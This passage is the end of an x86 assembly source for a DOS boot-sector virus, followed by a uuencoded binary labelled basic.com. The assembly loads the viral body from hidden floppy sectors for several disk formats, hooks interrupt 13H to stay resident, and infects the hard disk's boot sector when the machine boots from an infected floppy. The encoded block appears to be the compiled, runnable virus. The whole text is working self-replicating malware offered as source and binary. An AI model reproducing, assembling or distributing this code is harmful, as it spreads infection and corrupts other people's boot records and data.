        mov     ch,0                            ;track 0,
        mov     cl,2                            ;sector 2
        jmp     SHORT LOAD

LOAD_360:                                       ;load virus from 360 K floppy
        xor     dx,dx                           ;head 0, drive 0
        mov     ch,40                           ;track 40
        mov     cl,1                            ;sector 1
        mov     ax,209H                         ;read 9 sectors
        push    cx
        int     13H                             ;call BIOS to read the sectors
        pop     cx
        add     bx,9*512                        ;move es:bx up
        mov     dx,100H                         ;head 1, drive 0
        mov     al,6                            ;read 6 more sectors
        jmp     SHORT LOAD1

LOAD_12M:                                       ;load virus from 1.2 Meg floppy
        mov     dx,100H                         ;head 1, drive 0
        mov     ch,80                           ;track 80
        mov     cl,1                            ;sector 1
        jmp     SHORT LOAD

LOAD_720:                   ;load virus from 720K floppy
    xor dx,dx               ;head 0, drive 0
    mov ch,79               ;track 79
    mov cl,4                ;start at sector 4
    mov ax,206H             ;read 6 sectors
    int 13H
    add bx,6*512
    mov dx,100H             ;head 1, drive 0
    mov cx,79*256+1         ;track 79, sector 1
    mov al,9                ;read 9 more sectors
    jmp SHORT LOAD1         ;go do it

LOAD_14M:
    mov dx,100H             ;head 1, drive 0
    mov ch,79               ;track 79
    mov cl,4                ;start at sector 4
;   jmp SHORT LOAD          ;go do it

LOAD:   mov     al,15                           ;read 15 sectors
LOAD1:  mov     ah,2                            ;read command
        int     13H                             ;call BIOS to read it

MOVE_OLD_BS:
        xor     ax,ax                           ;now move old boot sector into
        mov     es,ax                           ;low memory
        mov     si,OFFSET SCRATCHBUF            ;at 0000:7C00
        mov     di,OFFSET BOOT_START
        mov     cx,256
        rep     movsw

SET_SEGMENTS:
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET STEALTH               ;set up the stack for the virus
        push    cs                              ;and also the segment registers
        push    cs
        pop     ds
        pop     es

INSTALL_INT13H:
        xor     ax,ax
        mov     ds,ax
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     ax,OFFSET INT_13H               ;and set up new interrupt 13H vector
        mov     bx,13H*4
        mov     ds:[bx],ax
        mov     ax,es
        add     bx,2
        mov     ds:[bx],ax
        sti

CHECK_DRIVE:
        push    cs                              ;set segments correctly
        pop     ds
        push    cs
        pop     es
        cmp     BYTE PTR [DR_FLAG],80H          ;if booting from a hard drive,
        jz      DONE                            ;nothing else needed at boot time

FLOPPY_DISK:                                    ;if loading from a floppy drive,
        call    IS_HARD_THERE                   ;see if a hard disk exists on this machine
        jz      DONE                            ;no hard disk, nothing else to do
        mov     al,80H                          ;else load the boot sector from drive C
        call    GET_BOOT_SEC                    ;into SCRATCHBUF
        call    IS_VBS                          ;and check it to see if it's the viral boot sector
        jz      DONE                            ;yes, hard drive already infected, nothing to do
        call    INFECT_HARD         ;no, go infect hard drive c:

DONE:
    mov si,OFFSET PART          ;clean partition data out of
    mov di,OFFSET PART+1        ;memory image of boot sector
    mov cx,3FH
    mov BYTE PTR [si],0
    rep movsb

        xor     ax,ax                           ;now go execute old boot sector
        push    ax                              ;at 0000:7C00
        mov     ax,OFFSET BOOT_START
        push    ax
        retf


        ORG     7DBEH

PART    DB      40H dup (?)                     ;partition table goes here

        ORG     7DFEH

        DB      55H,0AAH                        ;boot sector ID goes here

ENDCODE:

COMSEG  ENDS

        END     START

begin 775 basic.com
MZ?UZ````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M`````````````````````````````(`"````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````4`$!`E`!"0)0`0("4`$*`E`!`P)0`0L"4`$$`E`!#`)0`04"4`$-`E`!
M!@)0`0X"4`$'`E`!#P)0`0@"*``!`B@`!@(H``("*``'`B@``P(H``@"*``$
M`B@`"0(H``4"*`$!`B@!!@(H`0("*`$'`B@!`P(H`0@"*`$$`B@!"0(H`04"
M`````/N`_`)T"H#\`W1!+O\NA%Z`_@!U]H#]`701@/T`=>R`^0%T1X#Z@',6
MZ^"`^H!SVX#Y`776Z'8"=-'HD`+KS(#Z@'7'@/D1<\+I^`&`_@!UNH#]`'6U
M@/D!=0/I]@"`^H!UJ(#Y$7.CZ1@"4%-14AX&50X'#A^+[(K"Z(P$Z(D$^W,#
MZ<0`Z*D$=`/IO`"['GJ*!SR`=0*P!+,#]N,%)V&+V(HOBG<_QZ$7ON*1@P\`71M70508?Q@<`B_.+^T>T`+L``O?CB\A)\Z3XG%B)1A1='U]>6EE;6+0`
M_LF!ZP`"SYPN_QZ$7OM058OLG%B)1@IR#('K``+^R5U86+0`SUU8@\0"SXM&
M$E"=^)Q8B48270>HH'/(!U`K`$LP/VXP4G88O8BB^*=P&*
M3P**5@:+7@J+1@*.P+@!`XI&#)S_'H1>^XI6!H#Z@'4PQ@8>?("05E>_OGV+
M=@J!QKX!!A\.![D4`/.E#A^X`0.[`'RY`0"Z@`"<_QZ$7E]>BD8,/`%T/(I6
M!H#Z@'0T70!@X'#A_[NQ-ZBQ^*PH'[T`)U!>@K`.L?@?M@"74%Z*T`ZQ2!
M^Z`%=07H#`'K"8'[0`MU`^A?`0GE"*T+8!N08H
MN`$#G/\>A%Y8Z+]?<8&'GP`D%"[`'SHT0%8[
M`%Z*T+8`N0$HN`D#G/\>A%YR$X'#`!**T+8!N0$HN`4#G/\>A%[#4(K0M@"Y
M`2BX"06[/%Z<_QZ$7EA0BM"V`;D!*+@)!;M@7IS_'H1>6,/HG@'H3P!R2;L`
M>E"*T+8!N0]0N`$#G/\>A%Y8Z+]?<8&'GP!D%"[
M`'SH00%8A%[H:`'#4(K0M@&Y`5"X#P6[`%Z<
M_QZ$7EC#NP!Z4(K0M@&Y"4^X`0.<_QZ$7EAR1[\#?+X#>KD-`/.EH/U[HOU]
MQ@8>?`*04+L`?.C?`%AR)KL`7HK0M@"Y!$^X!@.<_QZ$7G(2NP!JBM"V`;D!
M3[@(`YS_'H1>P[L`>E"*T+8!N1)/N`$#G/\>A%Y8Z+]?<8&'GP#D%"[`'SH@0!8A%[#L("B'GSH
M3`"[`'I0BM"V`+D0`+@!`YS_'H1>6%"_`WR^`WJY#0#SI;^^?;Z^>[DA`/.E
M6%"[`'SH,`!8NP!>BM"V`+D"`+@.`YS_'H1>P[`!"L##4+L`>HK0M@"U`+$!
ML`&T`IS_'H1>6,.*T+8`M0"Q`;`!M`.<_QZ$7L-65_R_'WR^'WJY#P#SIU]>
MPP`&4#/`CL"[>``FQ!\FBD<$HLMC)L9'!`]8!\,&4#/`CL"[>``FQ!^@RV,F
MB$<$6`?#````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````ZQW_````````````
M`````````````````````````?HSP([0CMB.P+P`?/NA$P2Q!M/@+8`(CL"#
M+A,$"[X`?(O^N0`!\Z4&N$U\4,L&'[L`7J`>?#P`=!4\`70I/`)T+CP#=$.Z
M@`"U`+$"ZT$STK4HL0&X"0)1S1-9@<,`$KH``;`&ZRNZ``&U4+$!ZR`STK5/
ML02X!@+-$X'#``RZ``&Y`4^P">L)N@`!M4^Q!+`/M`+-$S/`CL"^`'J_`'RY
M``'SI?J,R([0O`!>#@X?!S/`CMB^3`"_A%ZEI;B(7KM,`(D'C,"#PP*)!_L.
M'PX'@#X>?(!T$NB2YG0-L(#HD.;HMN9T`^@TYKZ^?;^_?;D_`,8$`/.D,\!0
MN`!\4,L`````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
%````5:H`
`
end
